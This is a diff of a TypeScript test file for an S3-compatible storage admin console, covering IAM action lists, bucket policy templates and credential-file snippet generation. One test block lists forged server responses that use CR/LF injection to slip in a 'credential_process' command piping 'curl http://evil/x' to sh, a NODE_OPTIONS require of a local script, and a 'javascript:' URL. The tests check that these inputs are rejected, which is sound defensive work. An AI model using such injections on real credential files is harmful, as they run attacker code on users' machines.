@@ -21,7 +21,8 @@ import {
   validateUserName
 } from '~/components/admin/-policies'
 import { applyBucketTemplate, BUCKET_POLICY_TEMPLATES, bucketPolicyTemplate } from '~/components/bucket-settings/-policy-templates'
-import { credentialsFileSnippet, envSnippet, profileName } from '~/components/admin/-credentials'
+import { credentialsFileSnippet, envSnippet, explainCreateKeyError, profileName, snippetProblem, validateSecretKey } from '~/components/admin/-credentials'
+import { AdminError } from '~/utils/admin/client'
 
 describe('name validation', () => {
   it('validates user names like the server', () => {
@@ -90,7 +91,7 @@ describe('IAM policy templates', () => {
 
 describe('admin actions, resources and condition keys', () => {
   it('lists every admin action, including the new self-service and probe actions', () => {
-    for (const a of ['admin:ProbeNetwork', 'admin:CreateOwnAccessKey', 'admin:DeleteOwnAccessKey', 'admin:GetDiscovery', 'admin:ScanNetwork', 'admin:UpdateUser', 'admin:GetPolicy', 'admin:GetBucket']) {
+    for (const a of ['admin:ProbeNetwork', 'admin:CreateOwnAccessKey', 'admin:DeleteOwnAccessKey', 'admin:GetDiscovery', 'admin:ScanNetwork', 'admin:UpdateUser', 'admin:GetPolicy', 'admin:GetBucket', 'admin:GetBucketCompression', 'admin:PutBucketCompression', 'admin:GetBucketEncryption', 'admin:PutBucketEncryption']) {
       expect(ADMIN_ACTIONS).toContain(a)
       expect(SIMULATOR_ACTIONS).toContain(a)
     }
@@ -101,7 +102,8 @@ describe('admin actions, resources and condition keys', () => {
   it('maps admin actions to their per-target resource type', () => {
     for (const a of ['admin:CreateUser', 'admin:GetUser', 'admin:UpdateUser', 'admin:DeleteUser', 'admin:CreateAccessKey', 'admin:UpdateAccessKey', 'admin:DeleteAccessKey']) expect(adminResourceType(a)).toBe('user')
     for (const a of ['admin:GetPolicy', 'admin:PutPolicy', 'admin:DeletePolicy']) expect(adminResourceType(a)).toBe('policy')
-    for (const a of ['admin:GetBucket', 'admin:ForceDeleteBucket']) expect(adminResourceType(a)).toBe('bucket')
+    for (const a of ['admin:GetBucket', 'admin:ForceDeleteBucket', 'admin:GetBucketCompression', 'admin:PutBucketCompression', 'admin:GetBucketEncryption', 'admin:PutBucketEncryption']) expect(adminResourceType(a)).toBe('bucket')
+    expect(ADMIN_RESOURCE_FORMS.find(f => f.type === 'bucket')!.description).toMatch(/GetBucketCompression, PutBucketCompression, GetBucketEncryption, PutBucketEncryption/)
     for (const a of ['admin:ListUsers', 'admin:ProbeNetwork', 'admin:CreateOwnAccessKey', 'admin:UpdateConfig', 's3:GetObject']) expect(adminResourceType(a)).toBeUndefined()
     expect(adminResourceType(' Admin:updateuser ')).toBe('user')
     expect(isAdminAction('admin:GetStats')).toBe(true)
@@ -215,9 +217,15 @@ describe('bucket policy templates', () => {
       const text = JSON.stringify(doc)
       expect(validatePolicyDocument(JSON.parse(text), 'bucket', 'photos')).toBeUndefined()
       expect(text).toContain('arn:aws:s3:::photos')
-      if (t.needsUser) expect(text).toContain('user/alice')
+      if (t.needsUser) expect(text).toContain('"AWS":["alice"]')
     })
   }
+
+  it('rejects an external IAM user ARN in a bucket policy', () => {
+    const doc = bucketPolicyTemplate('user-readonly', 'photos', { user: 'alice' })
+    doc.Statement[0]!.Principal = { AWS: ['arn:aws:iam::123456789012:user/team/alice'] }
+    expect(validatePolicyDocument(doc, 'bucket', 'photos')).toContain('IAM user ARNs are unsupported')
+  })
 
   it('replaces invalid text and appends to an existing policy, replacing equal Sids', () => {
     const first = applyBucketTemplate('', 'public-read', 'b')
@@ -241,18 +249,67 @@ describe('simulator conditions', () => {
 })
 
 describe('credential snippets', () => {
-  const input = { accessKey: 'AKIAEXAMPLE', secretKey: 'secret/+=', endpoint: 'http://10.0.0.5:9000', region: 'eu-1', profile: 'my profile!' }
+  const input = { accessKey: 'AKIAEXAMPLE', secretKey: 'secret/+=secret/+=', endpoint: 'http://10.0.0.5:9000', region: 'eu-1', profile: 'my profile!' }
 
   it('renders a .env snippet', () => {
-    expect(envSnippet(input)).toBe('AWS_ACCESS_KEY_ID=AKIAEXAMPLE\nAWS_SECRET_ACCESS_KEY=secret/+=\nAWS_REGION=eu-1\nAWS_ENDPOINT_URL=http://10.0.0.5:9000\n')
+    expect(envSnippet(input)).toBe('AWS_ACCESS_KEY_ID=AKIAEXAMPLE\nAWS_SECRET_ACCESS_KEY=secret/+=secret/+=\nAWS_REGION=eu-1\nAWS_ENDPOINT_URL=http://10.0.0.5:9000\n')
   })
 
   it('renders a credentials/config file snippet with a sanitised profile', () => {
     const s = credentialsFileSnippet(input)
     expect(s).toContain('[my-profile]')
     expect(s).toContain('[profile my-profile]')
-    expect(s).toContain('aws_secret_access_key = secret/+=')
+    expect(s).toContain('aws_secret_access_key = secret/+=secret/+=')
     expect(s).toContain('endpoint_url = http://10.0.0.5:9000')
     expect(profileName('')).toBe('gos3')
+  })
+})
+
+describe('credential snippets from untrusted server responses (gap-1)', () => {
+  const ok = { accessKey: 'GOS3AKEXAMPLE', secretKey: 'abcDEF123-_xyz/+=', endpoint: 'https://s3.example:9000', region: 'us-east-1' }
+
+  it('accepts what gos3 issues', () => {
+    expect(snippetProblem(ok)).toBeUndefined()
+    expect(snippetProblem({ ...ok, region: '' })).toBeUndefined()
+  })
+
+  it('refuses CR/LF and other injected lines instead of writing them into the files', () => {
+    const forged = [
+      { ...ok, accessKey: 'GOS3X\n\n[default]\ncredential_process = sh -c "curl -s http://evil/x|sh"\n[gos3]' },
+      { ...ok, secretKey: 's3cr3tvalue\nNODE_OPTIONS=--require=/tmp/evil.js' },
+      { ...ok, secretKey: 's3cr3tvalue\rX=1' },
+      { ...ok, secretKey: 'has space inside' },
+      { ...ok, accessKey: 'ab' },
+      { ...ok, secretKey: 'short' },
+      { ...ok, region: 'us-east-1\ncredential_process = evil' },
+      { ...ok, endpoint: 'http://h\nX=1' },
+      { ...ok, endpoint: 'javascript:alert(1)' }
+    ]
+    for (const i of forged) {
+      expect(snippetProblem(i), JSON.stringify(i)).toBeDefined()
+      expect(() => envSnippet(i)).toThrow()
+      expect(() => credentialsFileSnippet(i)).toThrow()
+    }
+  })
+})
+
+describe('caller-chosen key pairs', () => {
+  it('requires secrets of 16–128 printable characters (server rule)', () => {
+    expect(validateSecretKey('a'.repeat(15))).toBe('Must be 16–128 characters')
+    expect(validateSecretKey('a'.repeat(16))).toBeUndefined()
+    expect(validateSecretKey('a'.repeat(129))).toBe('Must be 16–128 characters')
+    expect(validateSecretKey('a'.repeat(15) + ' ')).toMatch(/printable/)
+  })
+
+  it('explains the 403 scoped admins get for a custom access key ID', () => {
+    const denied = new AdminError('AccessDenied', 'Access Denied', 403)
+    const e = explainCreateKeyError(denied, true)
+    expect(e).toBeInstanceOf(AdminError)
+    expect((e as AdminError).status).toBe(403)
+    expect((e as AdminError).message).toMatch(/admin:CreateAccessKey on the whole service/)
+    // Generated pairs and other errors are passed through.
+    expect(explainCreateKeyError(denied, false)).toBe(denied)
+    const other = new AdminError('InvalidArgument', 'bad', 400)
+    expect(explainCreateKeyError(other, true)).toBe(other)
   })
 })
